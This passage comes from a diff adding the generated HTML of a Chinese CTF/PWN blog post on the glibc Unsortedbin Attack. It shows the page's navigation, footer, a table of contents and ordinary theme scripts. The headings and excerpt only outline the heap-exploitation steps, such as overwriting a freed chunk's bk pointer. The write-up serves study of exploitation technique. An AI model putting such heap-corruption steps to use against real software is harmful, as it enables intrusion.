+        <h3 class="article-nav-title">
+            UnSortedbinAttack例题分析
+        </h3>
+      </div>
+    <div class="article-nav-link-wrap right">
+          <img data-src="/HFTTC.github.io/images/banner.webp" data-sizes="auto" alt="Unlink例题分析" class="lazyload">
+      <a href="/HFTTC.github.io/2026/04/28/PWN/PWNCTF/Unlink%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8%EF%BC%88Unsortedbin%EF%BC%89/Unlink%E4%BE%8B%E9%A2%98%E5%88%86%E6%9E%90/" aria-label="后一篇: Unlink例题分析"  title="后一篇: Unlink例题分析"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+          Unlink例题分析
+      </h3>
+    </div>
+  </nav>
+
+</article>
+
+
+</section>
+        </div>
+        <footer id="footer" aria-label="Site footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    <div>
+      <span class="icon-copyright"></span>
+        2020-2026
+        <span class="footer-info-sep rotate"></span>
+      SEZUVEM=
+    </div>
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+      <div>
+        <span class="icon-brush"></span>
+        292.6k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        24:34
+      </div>
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+  </div>
+</footer>
+
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav" aria-label="Mobile navigation">
+  <div class="sidebar-wrap">
+        <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Unsortedbin-Attack-%E5%9F%BA%E6%9C%AC%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.</span> <span class="toc-text">Unsortedbin Attack 基本介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#UnSortedbin-Attack-%E6%A6%82%E8%BF%B0"><span class="toc-number">1.1.</span> <span class="toc-text">UnSortedbin Attack 概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#UnSortedbin-Attack-%E5%9B%9E%E9%A1%BE"><span class="toc-number">1.2.</span> <span class="toc-text">UnSortedbin Attack 回顾</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#global-max-fast-%E6%98%AF-main-arena-%E4%B8%AD%E6%8E%A7%E5%88%B6%E6%9C%80%E5%A4%A7-fastbin-%E5%A4%A7%E5%B0%8F%E7%9A%84%E5%8F%98%E9%87%8F"><span class="toc-number">2.</span> <span class="toc-text">global_max_fast 是 main_arena 中控制最大 fastbin 大小的变量</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#unsortedbin-%E7%9A%84%E7%BB%93%E6%9E%84"><span class="toc-number">2.1.</span> <span class="toc-text">unsortedbin 的结构</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#UnSortedbin-%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%9D%A5%E6%BA%90"><span class="toc-number">2.2.</span> <span class="toc-text">UnSortedbin 的基本来源</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#unsortedbin-%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="toc-number">2.3.</span> <span class="toc-text">unsortedbin 的使用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#UnsortedBin-Attack-%E5%8E%9F%E7%90%86"><span class="toc-number">2.4.</span> <span class="toc-text">UnsortedBin Attack 原理</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#stack-var-p-%E7%9A%84%E5%88%9D%E5%A7%8B%E5%80%BC"><span class="toc-number">2.4.1.</span> <span class="toc-text">stack_var&amp;p 的初始值</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#unsigned-long-p-malloc-0x410"><span class="toc-number">2.4.2.</span> <span class="toc-text">unsigned long *p&#x3D;malloc(0x410);</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#malloc-500"><span class="toc-number">2.4.3.</span> <span class="toc-text">malloc(500);</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%BB%A7%E7%BB%AD-n-%E6%89%A7%E8%A1%8C-free-p"><span class="toc-number">2.4.4.</span> <span class="toc-text">继续 n 执行 free(p);</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%89%A7%E8%A1%8Cp-1-unsigned-long-stack-var-2"><span class="toc-number">2.4.5.</span> <span class="toc-text">执行p[1]&#x3D;(unsigned long)(&amp;stack_var-2);</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%89%A7%E8%A1%8Cmalloc-0x410"><span class="toc-number">2.4.6.</span> <span class="toc-text">执行malloc(0x410);</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">2.5.</span> <span class="toc-text">总结</span></a></li></ol></li></ol>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/HFTTC.github.io/avatar/head.jpg" data-sizes="auto" alt="SEZUVEM=" class="lazyload">
+  <div class="sidebar-author-name">SEZUVEM=</div>
+  <div class="sidebar-description">心之所向，无问西东</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">198</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/" aria-label="首页"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/archives" aria-label="归档"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/about" aria-label="关于"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/friend" aria-label="友链"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+</div>
+</div>
+  </div>
+      <div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div>
+</nav>
+
+    </div>
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+
+<script src="/HFTTC.github.io/js/script.js"></script>
+
+
+  
+<script src="/HFTTC.github.io/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+<script src="/HFTTC.github.io/js/pjax_script.js" data-pjax></script>
+
+
+
+
+  <script>
+    var setupFirework = () => {
+      if (!false || !window.matchMedia('(max-width: 768px)').matches) {
+        window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["var(--red-1)","var(--red-2)","var(--red-3)","var(--red-4)"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["var(--red-0)"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'));
+      }
+    }
+  </script>
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.2.0/dist/index.umd.js" integrity="sha384-qi9WggRt19tv8Vc7pCHW3ulMNLwrn515zaLEWZjl1px07vz8+pUoWX8n1rgq282T" crossorigin="anonymous" onload="setupFirework()" defer></script>
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "SEZUVEM=",
+          title: "index",
+          url: "https://idcm-svg.github.io/HFTTC.github.io/2026/04/28/PWN/PWNCTF/UnsortedbinAttack%E5%9F%BA%E6%9C%AC%E4%BB%8B%E7%BB%8D/index/",
+          excerpt: "",
+          description: "",
+          stripContent: "Unsortedbin Attack 基本介绍参考资料：https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/unsorted-bin-attack/ UnSortedbin Attack 概述unsortedbin attack 顾名思义，该攻击和 Glibc 堆管理中的 Unsortedbin 的机制息息相关 。 unsortedbin attack 被利用的前提是控制 UnSorted Bin Chunk 的 bk 指针 unsor",
+          date: "Tue Apr 28 2026 18:25:58 GMT+0800",
+          updated: "Tue Apr 28 2026 19:19:30 GMT+0800",
+          cover: "/HFTTC.github.io/images/banner.webp",
+        };
+      </script>
+        
+<script src="/HFTTC.github.io/js/insert_highlight.js" data-pjax></script>
+
+      
+<script src="/HFTTC.github.io/js/tabs.js" data-pjax defer></script>
+
+      <script type="module" data-pjax>
+        (async () => {
+          const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+          const initPswp = (gallery, children) => {
+            if (_$$(`${gallery} ${children}`).length > 0) {
+              new PhotoSwipeLightbox({
+                gallery,
+                children,
+                pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+              }).init();
+            }
+          }
+          const pswp = () => {
+            initPswp('.article-entry', 'a.article-gallery-item');
+            initPswp('.article-gallery', 'a.article-gallery-item');
+          }
+          pswp();
+        })();
+      </script>
+        
+
+
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.12.3' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+
+  </body>
+  </html>
